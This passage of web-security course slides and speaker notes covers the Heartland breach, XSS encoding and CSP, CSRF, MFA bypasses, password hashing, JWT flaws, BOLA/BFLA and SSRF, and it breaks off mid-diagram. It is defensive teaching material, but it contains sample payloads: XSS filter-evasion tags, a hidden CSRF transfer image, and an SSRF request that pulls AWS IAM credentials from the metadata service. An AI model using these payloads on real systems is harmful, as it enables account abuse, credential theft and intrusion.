- **Vector**: Attackers compromised Heartland's internal network by exploiting SQL injection vulnerabilities in public-facing web applications.
- **Persistence**: Once inside the network, attackers installed packet-sniffing malware on the payment processing systems to capture card data in transit, before it was encrypted.
- **Duration**: The breach persisted undetected for several months (discovered in January 2009, breach began in 2008).
- **Attribution**: Albert Gonzalez and co-conspirators (TJX breach perpetrators), convicted in 2010.
- **Financial Impact**: Heartland incurred over $140 million in losses including fines, settlements, and remediation costs.
:::
::col::
::::card heading="Regulatory Consequences"
:::list style=tight
- Temporarily removed from PCI DSS compliant service providers list.
- Paid approximately $60 million to Visa and MasterCard in settlements.
- Faced class-action lawsuits from affected financial institutions.
- Required to implement end-to-end encryption (E2EE) across all processing systems.
:::
::::
::::

:::code language=mermaid caption="Heartland Payment Systems breach timeline: SQLi was the initial entry vector; the real damage was accomplished by lateral movement and memory-scraping malware installed after the initial compromise."
flowchart TB
  A["Late 2007<br/>SQL injection in a web application gives a foothold"] --> B["2008<br/>Packet-sniffing malware placed on payment processing systems"]
  B --> C["Card data captured in transit for months"]
  C --> D["January 2009<br/>Breach disclosed, about 130 million cards"]
  D --> E["2010<br/>Albert Gonzalez sentenced to 20 years"]
:::

:::notes
The Heartland Payment Systems breach of 2008 is one of the most important case studies in web application security history, not only because of its scale but because of what it reveals about how a single SQLi vulnerability can serve as the first link in a devastating attack chain. Heartland was not a small company with poor security awareness, they were a major payment processor handling transactions for over 250,000 businesses and were PCI DSS compliant at the time of the breach. Yet a SQL injection vulnerability in one of their public-facing web applications allowed attackers to establish an initial foothold in the network.

What followed is the pattern that makes web application attacks so dangerous in enterprise environments: lateral movement. Once the attackers were inside Heartland's corporate network, they moved from the compromised web server to more sensitive internal systems. They ultimately reached the payment processing environment, the systems that handle live credit card transaction data, and installed custom packet-sniffing malware that captured card data as it passed through the network in unencrypted form during processing. This is a critical distinction: the SQL injection vulnerability did not directly expose 130 million card numbers. It opened the door through which the attackers walked to reach the systems where card data lived.

The breach was detected in January 2009, not by Heartland's own security monitoring, but by fraud alerts from Visa and MasterCard who identified unusual patterns in transaction data and traced them back to Heartland's processing systems. This highlights a critical gap in many organizations' security programs: the ability to detect a compromise after it has occurred (detection and response) is as important as preventing it in the first place. NIST SP 800-61 (Computer Security Incident Handling Guide) provides the framework for building this detection and response capability.

The consequences were severe and multifaceted. Heartland was temporarily removed from the PCI DSS list of approved service providers, effectively preventing them from processing Visa and MasterCard transactions, until they completed a comprehensive remediation program. They paid approximately $60 million in settlements to card brands, faced over a hundred class-action lawsuits from banks and credit unions that had to reissue compromised cards, and ultimately incurred over $140 million in total losses. Albert Gonzalez, the primary orchestrator, was sentenced to 20 years in federal prison.

The Heartland breach drove widespread adoption of end-to-end encryption in payment processing environments and accelerated the PCI DSS's evolution toward more prescriptive requirements for network segmentation, intrusion detection systems, and file integrity monitoring. It is a foundational case study for understanding that web application security is not merely a software quality concern, it is an organizational risk management imperative with direct financial, regulatory, and reputational consequences.

Heartland was PCI DSS compliant at the time of its breach, which marks the difference between compliance and security: compliance is a point-in-time assessment, while security requires continuous monitoring and improvement.
:::

%%%
---
unit: Browser Exploits
code: XSSD
title: XSS Defense, Output Encoding and Content Security Policy
---
:::callout style=soft
Two complementary defense layers protect against XSS: **output encoding** prevents browsers from parsing injected text as HTML/JS, and **Content Security Policy (CSP)** instructs browsers to refuse executing unauthorized scripts even if encoding fails.
:::

::::columns ratio=1:1
::col::
:::list heading="Context-Aware Output Encoding Rules" style=plain
- **HTML Body context**: Encode `<`, `>`, `&`, `"`, `'` to HTML entities (`&lt;`, `&gt;`, etc.)
- **HTML Attribute context**: Encode all non-alphanumeric characters (percent-encoding or HTML entities).
- **JavaScript string context**: Encode backslash, quote, and special characters, use `JSON.stringify()` or OWASP Java Encoder.
- **URL context**: Percent-encode all non-safe characters before inserting into `href` or `src` attributes.
- **CSS context**: Avoid inserting user data into CSS; if required, use hex encoding and validate against allowlist.
:::
::col::
:::code language=http caption="Content Security Policy header, restricts which scripts the browser will execute"
# Strict CSP disallowing all inline scripts and
# restricting external scripts to your own domain only.
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted-library.com;
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';

# If an injected <script> tag fires, the browser
# refuses to execute it and reports the violation
# to the report-uri endpoint.
:::
::::

:::code language=mermaid caption="XSS defense in depth: output encoding neutralizes the payload at render time; CSP enforces a browser-level execution policy that blocks scripts even if encoding is missed."
flowchart TB
  subgraph E["Layer 1: output encoding"]
    direction LR
    I["Input containing a script tag"] --> F["HTML encoder turns < and > into entities"] --> S["Shown as text, never run"]
  end
  subgraph C["Layer 2: Content Security Policy"]
    direction LR
    J["Injected script that slipped through"] --> P["CSP allows only approved script sources"] --> B["Browser refuses to run it"]
  end
  E ~~~ C
:::

:::notes
Defending against XSS requires understanding a key architectural insight: XSS happens at the output stage, not the input stage. While input validation can reduce the attack surface by rejecting obvious script patterns, it is not a reliable primary defense. Attackers have an enormous variety of encoding, obfuscation, and alternative syntax options that can bypass input filters. HTML parsers accept malformed tags, partial tags, mixed-case tag names, and numerous alternative encodings that render as executable JavaScript. A filter that blocks `<script>` will be evaded by `<img src=x onerror=fetch('...')>` or `<svg onload=alert(1)>` or `javascript:` in a link href. The correct model is to treat any user-supplied data as untrusted throughout the entire system and to encode it defensively at the point where it is rendered into HTML output.

Context-aware output encoding is the critical phrase here. The encoding rules differ depending on where in the HTML document the user data is being placed. In the HTML body between tags, `<` must become `&lt;` and `>` must become `&gt;` to prevent tag injection. But if the user data is being placed inside a JavaScript string literal within a `<script>` tag, HTML entity encoding is insufficient, the JavaScript parser runs before the HTML parser for script content, and JavaScript string escape rules must be applied. If user data is embedded in a URL attribute like `href`, URL encoding must be applied first, and the URL scheme must be validated to prevent `javascript:` URIs. Libraries like OWASP Java Encoder, Microsoft's AntiXSS library, and the Go standard library's `html/template` package handle these context rules automatically and should be used in preference to custom encoding logic.

Content Security Policy (CSP) operates at the browser enforcement level as a second line of defense. A CSP header delivered with the HTTP response instructs the browser about which sources of scripts, styles, images, and other resources are legitimate. A policy of `script-src 'self'` instructs the browser to execute only scripts loaded from the same origin as the page, any inline script tag (which is where XSS payloads typically appear) and any script loaded from an external domain is blocked and not executed. The browser also generates a violation report that can be sent to a monitoring endpoint via the `report-uri` or `report-to` directive, giving security teams visibility into XSS attempts even when they are blocked.

The interaction of these two defenses is what makes them powerful in combination. If output encoding is correctly applied, injected script tags appear as visible text rather than executable code. If encoding is accidentally missed in one location, CSP prevents the browser from executing the script anyway. Bypassing both layers simultaneously requires either finding a whitelisted CDN that serves malicious content (a defense gap that can be closed with Subresource Integrity hashing) or exploiting a CSP bypass via JSONP endpoints, open redirectors, or other application-specific weaknesses. OWASP's CSP Cheat Sheet and Mozilla's MDN documentation on CSP provide detailed implementation guidance. CVE-2019-14751 and similar browser-level CSP bypass disclosures demonstrate that CSP configuration must be reviewed as carefully as the policies themselves.

Encoding < as &lt; prevents cross-site scripting in an HTML body but not inside a JavaScript string, because the JavaScript parser runs on different rules from the HTML parser and receives the decoded value. The correct encoding depends on the output context.
:::

%%%
---
unit: Browser Exploits
code: CSRF
title: Cross-Site Request Forgery (CSRF)
---
:::callout style=soft
**Cross-Site Request Forgery (CSRF)** (CWE-352) tricks an authenticated victim's browser into sending a forged HTTP request to a trusted web application, using the victim's existing authenticated session, without their knowledge or consent.
:::

::::columns ratio=1:1
::col::
:::list heading="How CSRF Works" style=plain
- **Prerequisite**: The victim is currently logged in to a target web application (e.g., their bank).
- **Attack vector**: The attacker hosts a malicious page or embeds an `<img>` tag or `<form>` that automatically sends a request to the bank.
- **Exploitation**: The victim's browser automatically attaches the bank's session cookie to the forged request.
- **Outcome**: The bank sees a valid session cookie and processes the request as if the victim initiated it (e.g., transferring funds).
:::
:::code language=html caption="CSRF attack payload, an img tag auto-fires a GET request with the victim's cookies"
<!-- Attacker embeds this on a malicious page -->
<!-- Browser auto-requests the src URL, including session cookies -->
<img src="https://bank.com/transfer?to=attacker&amount=5000"
     width="0" height="0" style="display:none">
:::
::col::
::::card heading="CSRF vs XSS: Key Distinction"
:::list style=tight
- **XSS** injects malicious script INTO the trusted site; the browser runs it in the trusted origin.
- **CSRF** sends a forged request FROM the victim's browser TO the trusted site; the malicious payload never enters the trusted site.
- **XSS** can bypass SOP; **CSRF** exploits the browser's automatic cookie attachment behavior.
:::
::::
::::card heading="CSRF Defenses"
:::list style=tight
- **Synchronizer Token Pattern (CSRF token)**: Embed a secret, unpredictable token in each form; server validates it on submission.
- **SameSite Cookie Attribute**: `SameSite=Strict` or `SameSite=Lax` prevents browsers from attaching cookies on cross-origin requests.
- **Double Submit Cookie**: Mirrors CSRF token in both a cookie and a request parameter; server validates they match.
:::
::::
::::

:::code language=mermaid caption="CSRF attack: the browser's automatic cookie attachment behavior is weaponized to send authenticated requests to a target site from a malicious third-party page."
sequenceDiagram
  participant V as Victim's browser
  participant B as bank.com
  participant A as attacker.com
  V->>B: Logs in
  B-->>V: Session cookie stored
  V->>A: Later visits attacker.com
  A-->>V: Page with a hidden auto-submitting form to bank.com
  V->>B: Transfer request, cookie sent automatically
  B-->>V: Transfer done, the bank thinks the user asked
  Note over V,B: Defenses: anti-CSRF tokens,<br/>SameSite cookies, re-authentication
:::

:::notes
Cross-Site Request Forgery is often contrasted with XSS in security curricula because the two attacks are frequently confused, yet they operate on fundamentally different principles. XSS is about injecting code into a trusted site so that the browser executes attacker-controlled JavaScript within the trusted origin. CSRF is about tricking a user's browser into submitting a request to a trusted site using the user's existing credentials, where the attacker never needs to inject code into the trusted site at all.

The mechanism that CSRF exploits is a feature, not a bug: browsers automatically attach cookies associated with a domain to any HTTP request sent to that domain, regardless of which web page initiated the request. When you are logged into your bank and have a session cookie for bank.com, and you visit attacker.com, and attacker.com contains an image tag with `src="https://bank.com/transfer?to=attacker&amount=5000"`, your browser dutifully sends a GET request to bank.com and attaches your session cookie. From bank.com's perspective, this looks identical to a legitimate request you initiated, it has a valid session cookie, a valid user agent, and valid request formatting. Without a CSRF defense, the bank processes the transfer.

The Synchronizer Token Pattern is the classical CSRF defense. When the server renders a form (like a transfer form), it embeds a secret, random, per-session (or per-request) token as a hidden field. When the form is submitted, the server validates that the submitted token matches the one it issued. Because the Same-Origin Policy prevents attacker.com from reading the HTML of bank.com to extract the token, the attacker cannot include the correct token in a forged request, and the server rejects it. Frameworks like Django, Rails, Spring Security, and Laravel implement CSRF token generation and validation automatically for all state-changing requests.

The `SameSite` cookie attribute, introduced in 2016 and now supported by all major browsers, provides a simpler and increasingly reliable defense. Setting `SameSite=Strict` on a session cookie instructs the browser to never attach it to any cross-origin request, period. Setting `SameSite=Lax` (the current default in Chrome) allows the cookie on top-level navigation (like clicking a link) but blocks it on embedded requests like `<img>`, `<form>` auto-submissions, and XHR/fetch. For most web applications, `SameSite=Lax` provides sufficient CSRF protection while maintaining reasonable usability.

CVE-2020-11022 and similar vulnerabilities in popular JavaScript libraries have demonstrated that CSRF can be combined with other attack vectors. NIST SP 800-53 SC-23 (Session Authenticity) provides the control requirement that maps to CSRF prevention. The OWASP CSRF Cheat Sheet is the definitive implementation reference. CSRF matters chiefly for state-changing requests (POST, PUT, DELETE) and not for GET, because GET is supposed to be idempotent, a principle that connects directly to REST API design.
:::

%%%
---
unit: Authentication
code: MFA
title: Multi-Factor Authentication, Types and Bypass Attacks
---
:::callout style=soft
**Multi-Factor Authentication (MFA)** requires verification of at least two independent factors from different categories: **something you know**, **something you have**, and **something you are**. It is the single most impactful control for preventing account takeover.
:::

:::table
| MFA Factor Type | Examples | Phishing Resistant? | Replay Resistant? |
|---|---|---|---|
| SMS / Voice OTP | 6-digit code via text message | No | Yes (time-limited) |
| TOTP App | Google Authenticator, Authy | No | Yes (30-second window) |
| Push Notification | Duo Security, Microsoft Authenticator | Partially | Yes |
| Hardware Security Key (FIDO2/WebAuthn) | YubiKey, Google Titan | Yes | Yes |
| Biometric (on-device) | Touch ID, Face ID (FIDO2 bound) | Yes | Yes |
:::

::::columns ratio=1:1
::col::
::::card heading="MFA Bypass Attacks"
:::list style=tight
- **Real-Time Phishing (AiTM)**: A proxy phishing page (Evilginx2, Modlishka) sits between victim and real site, forwarding credentials and MFA codes in real time to steal session cookies.
- **SIM Swapping**: Attacker socially engineers the carrier into porting the victim's phone number to an attacker SIM, intercepting SMS OTPs.
- **MFA Fatigue / Push Bombing**: Attacker sends repeated push approval requests hoping the victim accepts to stop the notifications.
- **SS7 Attacks**: Exploiting telecom protocol vulnerabilities to intercept SMS messages in transit.
:::
::::
::col::
::::card heading="Why FIDO2/WebAuthn Wins"
:::list style=tight
- The security key generates a **site-specific cryptographic signature** for each login, the key material never leaves the device.
- The WebAuthn protocol binds the credential to the **exact origin** (domain), a phishing copy-cat domain receives a different challenge and the attack fails.
- Even a perfect man-in-the-middle proxy cannot replay the WebAuthn response because the challenge is unique per-request.
:::
::::
::::

:::code language=mermaid caption="MFA type comparison and AiTM bypass: software-based OTP methods are vulnerable to real-time phishing proxies; only FIDO2/WebAuthn hardware keys provide phishing-resistant authentication."
flowchart LR
  S["<b>MFA strength, weakest to strongest</b><br/>SMS OTP: SIM swap, interception<br/>TOTP app: real-time phishing<br/>Push notification: MFA fatigue<br/>FIDO2 hardware key: phishing-resistant<br/>FIDO2 biometric passkey: phishing-resistant"] ~~~ B["<b>Bypass techniques</b><br/>SIM swapping<br/>Adversary-in-the-middle proxies<br/>Push bombing<br/>Session cookie theft after login<br/>Help desk social engineering"]
:::

:::notes
Multi-Factor Authentication has become the most widely recommended immediate control for reducing account takeover risk. The principle is straightforward: requiring a second independent factor means that compromising any single factor (typically a password through phishing, data breach, or guessing) is not sufficient to gain access. According to Microsoft's internal data, enabling MFA blocks approximately 99.9 percent of automated account compromise attacks. The 2022 CISA advisory on Implementing Phishing-Resistant MFA specifically recommends MFA as a mandatory control for all federal agencies, a recommendation that has been broadly adopted in enterprise security frameworks.

However, it is critical for students to understand that not all MFA methods provide equivalent protection, and several methods that were considered strong defenses a decade ago are now known to be bypassable by sophisticated attackers. SMS-based OTPs were once regarded as a significant security improvement over passwords alone. Today, they are known to be vulnerable to SIM-swapping attacks (the 2019 Twitter hack of celebrity accounts including Barack Obama and Elon Musk was accomplished in part via SIM swapping), SS7 protocol attacks that allow interception of SMS messages at the carrier level, and real-time phishing proxies.

The adversary-in-the-middle (AiTM) attack deserves particular attention because it bypasses all time-based OTP methods, SMS OTPs, TOTP codes from authenticator apps, and push notifications. Tools like Evilginx2 operate as transparent proxies: the victim thinks they are talking directly to the legitimate service, but every request and response passes through the attacker's proxy. When the victim enters their username, password, and 6-digit TOTP code, the proxy forwards these to the real service in real time, completes the authentication, and steals the resulting session cookie. The attacker now has a valid authenticated session. The TOTP code was valid and the authentication was successful, but it happened for the attacker. Microsoft Threat Intelligence tracked a large-scale AiTM phishing campaign in 2022 that compromised over 10,000 organizations using this exact technique.

FIDO2/WebAuthn hardware security keys provide phishing-resistant MFA because the cryptographic protocol is origin-aware. When a user registers a YubiKey with `bank.com`, the key generates an origin-bound credential that is mathematically tied to the exact origin `https://bank.com`. When a login challenge is issued, the key signs it with this origin-bound private key. An AiTM proxy at `https://bank-secure.com` cannot complete this flow because the WebAuthn protocol challenge is bound to the real origin, the key will refuse to sign for `https://bank-secure.com`. The phishing proxy cannot replay a valid WebAuthn response because the response is unique to each login challenge. This is why NIST SP 800-63B Level 3 assurance requires phishing-resistant authenticators, which in practice means FIDO2 keys or on-device biometrics bound to FIDO2 credentials.

The MFA fatigue attack in the 2022 Uber breach sent the victim repeated push notifications until one was accepted to stop them. It is a human-factors attack rather than a technical bypass, which is why both user education and push rate limiting are needed in an MFA deployment.
:::

%%%
---
unit: Authentication
code: PWD
title: Password Storage, Hashing, Salting, and Peppering
---
:::callout style=soft
Password storage vulnerabilities allow attackers who obtain a database to crack plaintext passwords at scale. The correct approach combines a **slow hashing algorithm** with **per-user salts** and an optional **server-side pepper** to make offline cracking computationally infeasible.
:::

:::table
| Storage Method | Example | Vulnerability |
|---|---|---|
| Plaintext | `password123` | Instant exposure on DB breach |
| Fast hash (MD5/SHA-1) | `5f4dcc3b5aa765d61d8327de...` | Rainbow table attack / GPU cracking in seconds |
| Fast hash + salt | `SHA256(salt+password)` | Still crackable with GPU farms; too fast |
| Slow hash (bcrypt) | `$2b$12$...` | Cost factor makes GPU cracking ~100,000x slower |
| Slow hash + pepper | bcrypt + server-secret | Even DB dump alone cannot be cracked without pepper value |
:::

:::code language=python caption="Python, correct password hashing with bcrypt (work factor 12)"
import bcrypt

# HASHING: during registration
# Work factor 12 means 2^12 = 4096 rounds of hashing.
# Each hash takes ~300ms on modern hardware, acceptable for login,
# devastating for bulk cracking attempts.
password_bytes = password.encode('utf-8')
salt = bcrypt.gensalt(rounds=12)        # cryptographically random 128-bit salt
hashed = bcrypt.hashpw(password_bytes, salt)  # stored in DB

# VERIFICATION: during login, never compare the hash directly
# bcrypt.checkpw() extracts the salt from the stored hash automatically
is_valid = bcrypt.checkpw(password_bytes, stored_hash)
:::

:::code language=mermaid caption="Password storage comparison: the combination of a slow adaptive hash function (bcrypt/Argon2id) with a per-user salt and an optional server-side pepper provides defense-in-depth against offline cracking after a database breach."
flowchart TB
  P["<b>Plaintext</b><br/>Read directly from a stolen database"]
  M["<b>MD5 or SHA-1</b><br/>Fast: billions of guesses per second on GPUs; rainbow tables"]
  S["<b>Salted SHA-256</b><br/>No rainbow tables, but still fast to brute-force"]
  B["<b>bcrypt or Argon2id</b><br/>Slow by design with a tunable cost; unique salt per password"]
  P --> M --> S --> B
:::

:::notes
Password storage is one of those areas in security where many developers know the right answer but get the details wrong in ways that still leave users exposed. The wrong answers cluster into three common failure modes: storing passwords in plaintext, using cryptographic hash functions designed for speed (MD5, SHA-1, SHA-256), and using a hash function designed for speed even with a salt.

The plaintext storage failure is hopefully rare at this point, but it still occurs in legacy systems and was famously demonstrated by the 2012 Adobe breach that exposed plaintext (or trivially encrypted, due to ECB mode cipher usage) passwords for approximately 153 million user accounts. When passwords are stored in plaintext, a database breach gives attackers immediate access to every user's password, and since approximately 50 to 65 percent of users reuse passwords across sites, this instantly threatens those users' accounts on every other platform.

Fast cryptographic hash functions like MD5 and SHA-1 are designed for high throughput, that is their purpose in integrity checking and certificate applications. A modern consumer GPU can compute approximately 100 billion MD5 hashes per second and 30 billion SHA-256 hashes per second. An offline attacker who obtains a database of MD5-hashed passwords can run through billions of candidate passwords per second, rapidly recovering common passwords. Rainbow tables, precomputed lookup tables that map common passwords to their hashes, reduce this further to near-instantaneous lookups for unsalted hashes. Adding a per-user random salt (a unique random value stored alongside the hash) defeats rainbow tables by requiring a separate cracking pass for each account, but it does not change the fundamental speed problem.

The correct solution is to use a password hashing function specifically designed to be computationally expensive: bcrypt (NIST-approved, widely supported), scrypt (memory-hard, more resistant to ASIC cracking), or Argon2id (winner of the Password Hashing Competition 2015, now recommended by NIST SP 800-63B and OWASP). These functions have a configurable work factor or cost parameter that can be increased over time as hardware improves. At a bcrypt work factor of 12, a modern GPU can compute approximately 100 hashes per second, compared to billions for SHA-256. An attacker attempting to crack an 8-character password containing uppercase, lowercase, and digits faces over 200 trillion possible combinations, which at 100 hashes per second would require thousands of years.

A pepper is an additional server-side secret added to the password before hashing. Unlike the salt (which is stored in the database alongside the hash), the pepper is stored separately, in an environment variable, a secrets management system, or an HSM. An attacker who obtains only the database dump cannot crack the hashes without also obtaining the pepper. This adds a defense-in-depth layer specifically targeting database exfiltration scenarios. OWASP's Password Storage Cheat Sheet and NIST SP 800-63B section 5.1.1.2 provide authoritative guidance on these requirements.

The 2012 LinkedIn breach exposed about 117 million unsalted SHA-1 password hashes, which have been almost entirely cracked: common passwords appear thousands of times with identical hashes, a concrete illustration of why unsalted hashing is vulnerable to precomputed (rainbow) tables.
:::

%%%
---
unit: API Security
code: JWT
title: JSON Web Token (JWT) Vulnerabilities
---
:::callout style=soft
**JSON Web Tokens (JWTs)** are widely used for stateless API authentication. Misimplementation of JWT validation introduces critical vulnerabilities that allow token forgery and privilege escalation without knowing the server's secret key.
:::

::::columns ratio=1:1
::col::
:::list heading="JWT Structure" style=plain
- **Header**: Base64url-encoded JSON specifying the token type and signing algorithm (`{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: Base64url-encoded JSON containing claims (e.g., `{"sub": "user123", "role": "user", "exp": 1700000000}`).
- **Signature**: HMAC or RSA signature computed over `header.payload` using the server's secret key.
- **Format**: `base64url(header).base64url(payload).base64url(signature)`
:::
::col::
::::card heading="Critical JWT Vulnerabilities"
:::list style=tight
- **Algorithm Confusion (`alg: none`)**: A server that trusts the `alg` header field can be tricked into accepting a token with `"alg": "none"`, a token with no signature verification, which the attacker can forge freely.
- **RS256 → HS256 Confusion**: If a server accepts both asymmetric (RS256) and symmetric (HS256) algorithms, an attacker can sign a token with HS256 using the server's *public* RSA key (which is public) as the HMAC secret.
- **Weak Secret Key**: An HMAC-signed JWT with a weak or guessable secret can be cracked offline using tools like hashcat or jwt_tool.
:::
::::
::::

:::code language=mermaid caption="JWT algorithm confusion vulnerability: a server that trusts the algorithm field in the token header allows an attacker to specify alg:none, forging arbitrary tokens without knowing the signing secret."
flowchart LR
  L["<b>Legitimate token</b><br/>Header: alg HS256<br/>Payload: role = user<br/>Valid signature checked by the server"] ~~~ X["<b>Forged token</b><br/>Header: alg none<br/>Payload: role = admin<br/>No signature<br/>A server that trusts the header accepts it"]
  X --> D["Defense: server enforces its own algorithm allowlist<br/>and always verifies the signature"]
:::

:::notes
JSON Web Tokens have become the dominant mechanism for stateless authentication in REST APIs, single-page applications, and microservices architectures. Their structure is elegant and their use case is valid: rather than storing session state in a server-side database, the server encodes user claims (identity, roles, expiration time) into a signed token that the client stores and presents with each request. The server verifies the signature, trusts the claims, and responds accordingly, without any database lookup. At scale, this is enormously efficient.

However, the JWT specification and its common implementations contain several design and implementation pitfalls that have led to widespread, serious vulnerabilities in production systems. The most notorious is the algorithm confusion attack, also known as the `alg:none` attack or the `none` algorithm bypass. The JWT specification originally defined an algorithm value of `none` to represent "unsecured JWTs", tokens with no cryptographic signature. Some server-side JWT libraries, when processing a token, would read the `alg` field from the token's header and select the appropriate verification algorithm based on that value. An attacker who observes this behavior can craft a token with `"alg": "none"`, modify the payload claims (changing `"role": "user"` to `"role": "admin"`), remove the signature field entirely, and submit the token. A vulnerable server reads `alg: none`, selects the "no verification" code path, and accepts the forged claims. CVE-2015-9235 in the `jsonwebtoken` npm package and similar vulnerabilities in Java and Python JWT libraries exposed this flaw in widely deployed code.

The RS256-to-HS256 confusion attack is more subtle. RS256 uses asymmetric cryptography: the server signs tokens with its private key and clients can verify signatures using the server's public key (which is typically published at a `/.well-known/jwks.json` endpoint). HS256 uses symmetric cryptography: both signing and verification use the same secret key. A server that accepts tokens signed with either RS256 or HS256 is vulnerable if it determines the algorithm from the token header. An attacker can obtain the server's RSA public key (it's public!), sign a forged token using HS256 with the public key as the HMAC secret, and submit it. A vulnerable server reads `alg: HS256`, uses its RSA public key (which it makes available publicly) as the HMAC verification secret, and the verification passes, because the attacker used that same value to sign the token.

Weak HMAC secrets represent a third vulnerability class. If the server signs JWTs with a short, guessable, or default secret (commonly `secret`, `password`, `your-256-bit-secret`, or similar values found in JWT library documentation or tutorials), an attacker who obtains a valid JWT can use tools like hashcat with the `--hash-type 16500` (JWT) mode to attempt offline dictionary and brute-force attacks against the secret. A cracked HMAC secret allows the attacker to forge arbitrary JWTs with any claims.

Mitigations: Always specify and enforce the expected algorithm server-side, never trust the `alg` field from the token itself. Use a dedicated, cryptographically strong HMAC secret of at least 256 bits generated by a CSPRNG. Validate all standard claims: `exp` (expiration), `nbf` (not-before), `iss` (issuer), and `aud` (audience). The OWASP JWT Security Cheat Sheet and RFC 8725 (JSON Web Token Best Current Practices) are the authoritative references.

A JSON Web Token's header and payload are only Base64-encoded, not encrypted, so anyone can decode and read them; the signature protects integrity, not confidentiality. Confusing signing with encryption is a common error, and no secret should be placed in a JWT payload.
:::

%%%
---
unit: API Security
code: BFLA
title: BOLA vs BFLA, Object vs Function Authorization
---
:::callout style=soft
**BOLA** (Broken Object Level Authorization) and **BFLA** (Broken Function Level Authorization) are distinct but related API authorization failures. BOLA allows access to unauthorized **data records**; BFLA allows unauthorized invocation of **administrative functions**.
:::

::::columns ratio=1:1
::col::
::::card heading="BOLA, Object Level"
:::list style=tight
- **Risk**: OWASP API Security #1
- **Question not asked**: "Does this user own this specific object?"
- **Example**: `GET /api/v1/invoices/9987`, user can retrieve any invoice by changing the ID, not just their own.
- **Data impact**: Unauthorized read/modify/delete of any user's records.
:::
::::
::::card heading="BFLA, Function Level"
:::list style=tight
- **Risk**: OWASP API Security #5
- **Question not asked**: "Does this user have the role/privilege to call this function?"
- **Example**: `DELETE /api/v1/admin/users/44`, regular user calls an admin endpoint that the UI hides but the API doesn't protect.
- **Data impact**: Full account deletion, privilege escalation, system configuration changes.
:::
::::
::col::
:::table
| Attribute | BOLA | BFLA |
|---|---|---|
| Authorization scope | Object ownership | Function privilege |
| Attack method | Change object ID in URL | Call hidden/admin endpoint directly |
| Detection | Identical valid requests, different ID | Valid credentials, unexpected endpoint |
| Fix | Per-object ownership check | Role/permission check per endpoint |
| CVSS Impact | Confidentiality | Integrity / Availability |
:::
::::

:::code language=mermaid caption="BOLA vs BFLA: BOLA is a per-object ownership failure; BFLA is a per-function privilege failure. Both require server-side authorization checks that go beyond validating authentication."
flowchart LR
  A["<b>BOLA</b><br/>/api/invoices/100: own invoice, granted<br/>/api/invoices/101: someone else's, wrongly granted<br/>Missing: per-object ownership check"] ~~~ B["<b>BFLA</b><br/>Regular user calls POST /api/admin/refunds<br/>and the call succeeds<br/>Missing: per-function role check"]
:::

:::notes
The OWASP API Security Top 10 distinguishes BOLA and BFLA as separate risks, but in practice the two flaws share an identical root cause: API endpoints that verify authentication (is the caller logged in?) but skip authorization (is the caller allowed to do this specific thing?). Understanding the distinction helps developers build comprehensive authorization frameworks rather than fixing one type of flaw while overlooking the other.

BOLA, as we discussed in an earlier slide, exploits the gap between a user being authenticated and a user owning the specific data object they are requesting. The canonical example is a URL like `/api/v1/invoices/9987` where the identifier `9987` is predictable or sequential. An authenticated user can replace `9987` with `9988`, `9986`, `12345`, or any other value, and if the API only validates the authentication token and not whether the caller owns invoice `9987`, it returns the unauthorized record. At scale, this can be automated to enumerate and exfiltrate all records in a table. The T-Mobile 2021 API breach (exposing personal data of approximately 54 million customers) and the 2020 Zoom BOLA vulnerabilities are prominent recent examples.

BFLA targets the authorization model at the function level rather than the object level. Modern applications typically expose some API endpoints that are intended only for privileged users, administrators, internal service accounts, support staff. These endpoints may handle user deletion, account lockout, role assignment, configuration changes, or bulk data exports. The frontend UI simply does not display links to these endpoints for regular users, they are effectively hidden in the UI. However, the API endpoints themselves still exist and are reachable by anyone who can make HTTP requests. If the backend does not enforce role-based access control on these endpoints, a regular user who discovers the endpoint URL (through API documentation, browsing the JavaScript bundle, or simply guessing standard admin URL patterns like `/admin/`, `/management/`, `/internal/`) can call them directly.

The 2019 Peloton BFLA vulnerability is instructive: API endpoints intended for internal use by Peloton support staff were accessible to any authenticated user, allowing retrieval of other users' account details, workout history, and private settings. The distinction between what the mobile app's UI offered users and what the API's actual access controls enforced was the vulnerability.

The correct fix for both BOLA and BFLA is implementing authorization checks at the API layer for every request, not relying on the UI layer to prevent unauthorized calls. For BOLA: every endpoint that retrieves or manipulates a specific object must verify that the authenticated caller owns (or has explicit permission to access) that specific object. For BFLA: every endpoint that performs privileged operations must verify that the authenticated caller has the required role or permission before executing. A role-based access control (RBAC) or attribute-based access control (ABAC) framework should be applied uniformly across all endpoints, not added as an afterthought to endpoints that "seem sensitive." NIST SP 800-162 provides guidance on ABAC implementation and NIST SP 800-53 AC-3 (Access Enforcement) is the relevant security control.

The browser developer tools Network tab reveals the API endpoints a web application calls. Whether a regular user could call those same endpoints with different parameters, or against objects they do not own, is the real question, because the API, not the UI, is the attack surface.
:::

%%%
---
unit: Injection
code: SSRF
title: Server-Side Request Forgery (SSRF)
---
:::callout style=soft
**Server-Side Request Forgery (SSRF)** (CWE-918, OWASP **A10**) causes a server to make HTTP requests on behalf of the attacker, enabling access to internal network resources, cloud metadata services, and internal APIs that are not reachable from the public internet.
:::

::::columns ratio=1:1
::col::
:::list heading="SSRF Attack Scenarios" style=plain
- **Cloud Metadata Theft**: Target `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` (AWS EC2 metadata) to steal IAM credentials.
- **Internal Port Scanning**: Use the server as a proxy to map internal network services (`http://internal-db.corp:5432`).
- **Internal API Access**: Reach administrative APIs only bound to localhost or internal interfaces.
- **File Read**: On systems with the `file://` scheme, read local files (`file:///etc/passwd`).
:::
::col::
:::code language=http caption="SSRF exploit, attacker supplies a malicious URL to an image fetch endpoint"
# The application offers an image proxy endpoint:
# GET /api/fetch-preview?url=<external_url>

# Attacker supplies a crafted URL targeting
# the AWS EC2 instance metadata service:
GET /api/fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServer-Role

# The server makes an outbound HTTP request to this internal address.
# The response contains temporary AWS IAM credentials:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }
# Attacker uses these credentials to access AWS S3, EC2, RDS.
:::
::::

:::code language=mermaid caption="SSRF: the web application server acts as a proxy, making requests to internal resources that are unreachable from the public internet, including cloud metadata services that expose privileged credentials."
flowchart LR
  A["Attacker's browser<br/>(internet)"] --> W["Web application server<br/>(DMZ)"]
  W -->|"forged server-side request"| DB["Internal database<br/>(internal network)"]
